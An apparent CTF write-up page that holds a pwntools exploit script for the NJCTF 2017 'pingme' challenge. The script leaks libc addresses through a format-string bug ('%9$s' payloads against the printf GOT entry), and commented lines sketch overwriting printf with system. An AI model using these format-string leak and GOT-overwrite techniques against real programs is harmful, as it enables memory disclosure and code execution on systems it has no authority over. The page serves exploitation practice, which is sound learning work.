<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><link rel="icon" href="/notes/favicon.ico"/><title>Njctf2017_pingme</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal Knowledge Space"/><meta property="og:title" content="Njctf2017_pingme"/><meta property="og:description" content="Personal Knowledge Space"/><meta property="og:url" content="https://b1babo.github.io/notes/notes/epxdpi05tjyaz9lk4o0bfa0/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="12/28/2022"/><meta property="article:modified_time" content="12/28/2022"/><link rel="canonical" href="https://b1babo.github.io/notes/notes/epxdpi05tjyaz9lk4o0bfa0/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/notes/_next/static/css/43ff47b87e0ea661.css" as="style"/><link rel="stylesheet" href="/notes/_next/static/css/43ff47b87e0ea661.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/notes/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/notes/_next/static/chunks/webpack-3c3caf24173c5c0a.js" defer=""></script><script src="/notes/_next/static/chunks/framework-28c999baf2863c3d.js" defer=""></script><script src="/notes/_next/static/chunks/main-5bb057769933cd70.js" defer=""></script><script src="/notes/_next/static/chunks/pages/_app-9ff413458d97c377.js" defer=""></script><script src="/notes/_next/static/chunks/935-4dee79e80b8641c6.js" defer=""></script><script src="/notes/_next/static/chunks/6-50972def09142ee2.js" defer=""></script><script src="/notes/_next/static/chunks/pages/notes/%5Bid%5D-78d472fa3b924116.js" defer=""></script><script src="/notes/_next/static/TVRBOQx7vrqEyJPi_2-lA/_buildManifest.js" defer=""></script><script src="/notes/_next/static/TVRBOQx7vrqEyJPi_2-lA/_ssgManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout" style="margin-top:64px;display:flex;flex-direction:row"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><main class="ant-layout-content side-layout-main" style="max-width:1200px;min-width:0;display:block"><div style="padding:0 24px"><div class="main-content" role="main"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="njctf2017_pingme"><a aria-hidden="true" class="anchor-heading icon-link" href="#njctf2017_pingme"></a>Njctf2017_pingme</h1>
<pre class="language-py"><code class="language-py">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 
<span class="token keyword">import</span> os
<span class="token comment"># ========================================</span>
is_debug <span class="token operator">=</span> <span class="token boolean">False</span>
is_debug <span class="token operator">=</span> <span class="token boolean">True</span>
architecture <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"arch"</span><span class="token punctuation">:</span><span class="token string">"i386"</span><span class="token punctuation">,</span><span class="token string">"os"</span><span class="token punctuation">:</span><span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"endian"</span><span class="token punctuation">:</span><span class="token string">"little"</span><span class="token punctuation">,</span><span class="token string">"bits"</span><span class="token punctuation">:</span><span class="token number">64</span><span class="token punctuation">}</span>
architecture <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"arch"</span><span class="token punctuation">:</span><span class="token string">"amd64"</span><span class="token punctuation">,</span><span class="token string">"os"</span><span class="token punctuation">:</span><span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"endian"</span><span class="token punctuation">:</span><span class="token string">"little"</span><span class="token punctuation">,</span><span class="token string">"bits"</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">}</span>
<span class="token comment"># is_remote = True</span>
is_remote <span class="token operator">=</span> <span class="token boolean">False</span>
ip <span class="token operator">=</span> <span class="token string">""</span>
port <span class="token operator">=</span> <span class="token string">""</span>
target <span class="token operator">=</span> <span class="token string">"./pingme"</span>
target_libc <span class="token operator">=</span> <span class="token string">""</span>
env <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token comment"># ========================================</span>
<span class="token keyword">def</span> <span class="token function">_which</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"which "</span> <span class="token operator">+</span> p <span class="token operator">+</span> <span class="token string">" >/dev/null 2>&#x26;1"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>



<span class="token comment"># ========================================</span>
<span class="token keyword">if</span> is_debug<span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'info'</span>
context<span class="token punctuation">(</span>os<span class="token operator">=</span>architecture<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>arch<span class="token operator">=</span>architecture<span class="token punctuation">[</span><span class="token string">"arch"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>bits<span class="token operator">=</span>architecture<span class="token punctuation">[</span><span class="token string">"bits"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> <span class="token string">""</span>
libc <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">if</span> target<span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>binary <span class="token operator">=</span> target
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
<span class="token keyword">if</span> target_libc<span class="token punctuation">:</span>
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>target_libc<span class="token punctuation">)</span>

<span class="token keyword">if</span> _which<span class="token punctuation">(</span><span class="token string">"tmux"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
<span class="token keyword">elif</span> _which<span class="token punctuation">(</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    terminal <span class="token operator">=</span> <span class="token boolean">None</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> terminal

<span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token operator">=</span>remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"remote:too many requests,I am tried,sleep one second please"</span><span class="token punctuation">)</span>
            sleep<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">break</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token operator">=</span>process<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"local:too many process,I can not malloc any memory"</span><span class="token punctuation">)</span>
            log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bye~~"</span><span class="token punctuation">)</span>
            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>gdbscript<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> stop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>io<span class="token punctuation">,</span> process<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> stop<span class="token punctuation">:</span>
            pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gdbscript<span class="token punctuation">)</span>

stop <span class="token operator">=</span> pause
S <span class="token operator">=</span> pause
leak <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span> address<span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"{{}} ===> {{}}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span> io<span class="token punctuation">.</span>send
sl  <span class="token operator">=</span> io<span class="token punctuation">.</span>sendline
sla <span class="token operator">=</span> io<span class="token punctuation">.</span>sendlineafter
sa  <span class="token operator">=</span> io<span class="token punctuation">.</span>sendafter
slt <span class="token operator">=</span> io<span class="token punctuation">.</span>sendlinethen
st  <span class="token operator">=</span> io<span class="token punctuation">.</span>sendthen
r   <span class="token operator">=</span> io<span class="token punctuation">.</span>recv
rn  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvn
rr  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvregex
ru  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil
ra  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall
rl  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline
rs  <span class="token operator">=</span> io<span class="token punctuation">.</span>recvlines
rls <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline_startswith
rle <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline_endswith
rlc <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline_contains
ia  <span class="token operator">=</span> io<span class="token punctuation">.</span>interactive
ic  <span class="token operator">=</span> io<span class="token punctuation">.</span>close
cr  <span class="token operator">=</span> io<span class="token punctuation">.</span>can_recv



buffer_padding <span class="token operator">=</span> <span class="token keyword">lambda</span> offset <span class="token punctuation">:</span> offset<span class="token operator">*</span><span class="token string">'A'</span>


<span class="token keyword">def</span> <span class="token function">exec_fmt</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    info <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> info
<span class="token comment"># auto = FmtStr(exec_fmt)</span>
<span class="token comment"># offset = auto.offset</span>
<span class="token comment"># fmtstr_payload(7, {printf_got: system_addr})</span>

<span class="token keyword">def</span> <span class="token function">DynELF_leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">b"%9$s.AAA"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".AAA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span> 
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"leaking: 0x%x --> %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>addr<span class="token punctuation">,</span> data<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> data
<span class="token comment"># data = DynELF(DynELF_leak, elf.plt["printf"],elf=elf)     # Entry point address</span>
<span class="token comment"># system_addr = data.lookup('system', 'libc')</span>
<span class="token comment"># printf_addr = data.lookup('printf', 'libc')</span>
<span class="token comment"># log.info("system address: 0x%x" % system_addr)</span>
<span class="token comment"># log.info("printf address: 0x%x" % printf_addr)</span>


<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
<span class="token comment"># libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)</span>
<span class="token comment"># libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')</span>
<span class="token comment"># system_addr = libcbase + libc_searcher.dump('system')</span>
<span class="token comment"># binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')</span>
<span class="token comment"># libc_searcher = LibcSearcher('printf', printf_addr)</span>
<span class="token comment"># libcbase = printf_addr - libc_searcher.dump('printf')</span>
<span class="token comment"># system_addr = libcbase + libc_searcher.dump('system')</span>

<span class="token comment"># ========================================</span>


S<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># debug(gdbscript="b *main\r\nb printf")</span>
<span class="token comment"># print(hex(elf.got["printf"]))</span>
printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
<span class="token comment"># 数字在后面，前面为字符串，防止被截断，AAA在后面为了使用ru(".AAA")，利于定位，如果是".AAA%9$s",不利于定位</span>
payload <span class="token operator">=</span> <span class="token string">b"%9$s.AAA"</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span>
rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
data <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">".AAA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf address: %s"</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>



ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># S()</span>


</code></pre></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div></div></div></div></div></div></div></div></div></div></div><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></main></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"epxdpi05tjyaz9lk4o0bfa0","title":"Njctf2017_pingme","desc":"","updated":1672232485842,"created":1672228677711,"custom":{},"fname":"computer.security.ctf.pwn.wp.njctf2017_pingme","type":"note","vault":{"fsPath":".","selfContained":true,"name":"dendron-note"},"contentHash":"4e4f6f48eee053368a31a7cf36ad924e","links":[],"anchors":{},"children":[],"parent":"rja6lqxtia650oetbi4yshi","data":{}},"body":"\u003ch1 id=\"njctf2017_pingme\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#njctf2017_pingme\"\u003e\u003c/a\u003eNjctf2017_pingme\u003c/h1\u003e\n\u003cpre class=\"language-py\"\u003e\u003ccode class=\"language-py\"\u003e\n\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e pwn \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \n\u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e os\n\u003cspan class=\"token comment\"\u003e# ========================================\u003c/span\u003e\nis_debug \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eFalse\u003c/span\u003e\nis_debug \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTrue\u003c/span\u003e\narchitecture \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"arch\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"i386\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"os\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"linux\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"endian\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"little\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"bits\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token number\"\u003e64\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\narchitecture \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"arch\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"amd64\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"os\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"linux\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"endian\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"little\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"bits\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# is_remote = True\u003c/span\u003e\nis_remote \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eFalse\u003c/span\u003e\nip \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\nport \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\ntarget \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"./pingme\"\u003c/span\u003e\ntarget_libc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\nenv \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e# ========================================\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003e_which\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ep\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e os\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esystem\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"which \"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e p \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003e\" \u003e/dev/null 2\u003e\u0026#x26;1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\n\n\n\n\u003cspan class=\"token comment\"\u003e# ========================================\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e is_debug\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    context\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003elog_level\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token string\"\u003e'debug'\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    context\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003elog_level\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token string\"\u003e'info'\u003c/span\u003e\ncontext\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eos\u003cspan class=\"token operator\"\u003e=\u003c/span\u003earchitecture\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"os\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003earch\u003cspan class=\"token operator\"\u003e=\u003c/span\u003earchitecture\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"arch\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003ebits\u003cspan class=\"token operator\"\u003e=\u003c/span\u003earchitecture\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"bits\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nelf \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\nlibc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e target\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    context\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebinary \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e target\n    elf \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e ELF\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e target_libc\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    libc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e ELF\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget_libc\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e _which\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"tmux\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    terminal \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e'tmux'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'splitw'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'-h'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelif\u003c/span\u003e _which\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'gnome-terminal'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    terminal \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e'tmux'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'--'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'sh'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'-c'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    terminal \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\ncontext\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eterminal \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e terminal\n\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e is_remote\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            io\u003cspan class=\"token operator\"\u003e=\u003c/span\u003eremote\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eip\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003eport\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"remote:too many requests,I am tried,sleep one second please\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            sleep\u003cspan 